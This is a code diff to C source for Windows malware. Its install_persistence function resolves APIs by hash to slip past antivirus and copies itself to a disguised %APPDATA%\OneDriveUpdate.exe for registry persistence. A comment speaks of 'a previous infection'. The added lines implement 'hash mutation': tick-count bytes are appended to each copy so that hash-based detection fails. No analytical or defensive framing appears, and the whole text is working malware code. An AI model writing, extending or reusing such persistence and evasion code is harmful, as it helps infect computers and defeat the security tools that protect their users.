@@ -12,6 +12,12 @@ typedef LONG (WINAPI *pRegCloseKey)(HKEY hKey);
 typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
 typedef BOOL (WINAPI *pCopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
 
+// --- new typedefs for hash mutation (overlay padding)
+typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+typedef BOOL (WINAPI *pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
+typedef DWORD (WINAPI *pGetTickCount)(void);
+
 bool install_persistence(const char* current_exe_path) {
     // load key runtime (in stack)
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
@@ -32,6 +38,10 @@ bool install_persistence(const char* current_exe_path) {
     DWORD hash_RegCloseKey = 0x736B3702;     // djb2 for "RegCloseKey"
     DWORD hash_GetEnvVarA = 0x87889701;      // djb2 for "GetEnvironmentVariableA"
     DWORD hash_CopyFileA = 0xAC2253C1;       // djb2 for "CopyFileA"
+    DWORD hash_CreateFileA = 0xEB96C5FA;     // djb2 for "CreateFileA"
+    DWORD hash_WriteFile = 0x5088CF53;       // djb2 for "WriteFile"
+    DWORD hash_CloseHandle = 0x3870CA07;     // djb2 for "CloseHandle"
+    DWORD hash_GetTickCount = 0x41AD16B9;    // djb2 for "GetTickCount"
 
     // --- load DLL dynamically
 
@@ -56,9 +66,13 @@ bool install_persistence(const char* current_exe_path) {
     pRegCloseKey fnRegCloseKey = (pRegCloseKey) get_api_by_hash(hAdvapi, hash_RegCloseKey);
     pGetEnvironmentVariableA fnGetEnvVarA = (pGetEnvironmentVariableA) get_api_by_hash(hKernel32, hash_GetEnvVarA);
     pCopyFileA fnCopyFileA = (pCopyFileA) get_api_by_hash(hKernel32, hash_CopyFileA);
+    pCreateFileA fnCreateFileA = (pCreateFileA) get_api_by_hash(hKernel32, hash_CreateFileA);
+    pWriteFile fnWriteFile = (pWriteFile) get_api_by_hash(hKernel32, hash_WriteFile);
+    pCloseHandle fnCloseHandle = (pCloseHandle) get_api_by_hash(hKernel32, hash_CloseHandle);
+    pGetTickCount fnGetTickCount = (pGetTickCount) get_api_by_hash(hKernel32, hash_GetTickCount);
 
     // if AV blocks a function -> return
-    if (!fnRegOpenKeyExA || !fnRegSetValueExA || !fnRegCloseKey || !fnGetEnvVarA || !fnCopyFileA) return false;
+    if (!fnRegOpenKeyExA || !fnRegSetValueExA || !fnRegCloseKey || !fnGetEnvVarA || !fnCopyFileA || !fnCreateFileA || !fnWriteFile || !fnCloseHandle || !fnGetTickCount) return false;
 
     // --- self-copy logic
 
@@ -80,6 +94,22 @@ bool install_persistence(const char* current_exe_path) {
         // copy current exe to %APPDATA%\OneDriveUpdate.exe
         // NOTE: FALSE = overwrite file if it already exists from a previous infection
         fnCopyFileA(current_exe_path, dest_path, FALSE);
+
+        // --- hash mutation (overlay padding)
+        
+        // NOTE: open the newly copied file to append data (FILE_APPEND_DATA)
+        HANDLE hFile = fnCreateFileA(dest_path, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        
+        if (hFile != INVALID_HANDLE_VALUE) {
+            // generate pseudo-random bytes based on system uptime
+            DWORD junk_data = fnGetTickCount(); 
+            DWORD bytes_written = 0;
+            
+            // write 4 bytes to the end of the exe
+            fnWriteFile(hFile, &junk_data, sizeof(junk_data), &bytes_written, NULL);
+            fnCloseHandle(hFile);
+        }
+
     } else {
         // fallback: if APPDATA fails, use current path for registry
         strcpy(dest_path, current_exe_path);
